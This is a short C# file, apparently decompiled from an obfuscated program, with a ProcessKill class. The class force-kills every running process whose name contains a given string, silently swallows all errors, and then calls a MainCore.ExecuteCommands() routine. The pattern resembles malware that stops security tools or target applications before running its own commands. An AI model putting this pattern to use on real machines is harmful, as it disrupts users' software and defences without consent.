using System;
using System.ComponentModel;
using System.Diagnostics;

namespace MufMaOSvGyvz
{
	// Token: 0x02000021 RID: 33
	public class ProcessKill
	{
		// Token: 0x060000BB RID: 187
		public static bool CheckProcess(Process process_0, string string_0)
		{
			bool result;
			try
			{
				result = process_0.ProcessName.ToLower().Contains(string_0.ToLower());
			}
			catch (Win32Exception)
			{
				result = false;
			}
			catch (InvalidOperationException)
			{
				result = false;
			}
			catch (NullReferenceException)
			{
				result = false;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000BC RID: 188
		public static void KillProcess(string string_0, string string_1)
		{
			foreach (Process process in Process.GetProcesses())
			{
				if (ProcessKill.CheckProcess(process, string_0.ToLower()))
				{
					try
					{
						process.Kill();
						process.WaitForExit();
						MainCore.ExecuteCommands();
					}
					catch (InvalidOperationException)
					{
					}
					catch (PlatformNotSupportedException)
					{
						break;
					}
					catch
					{
					}
				}
			}
		}
	}
}
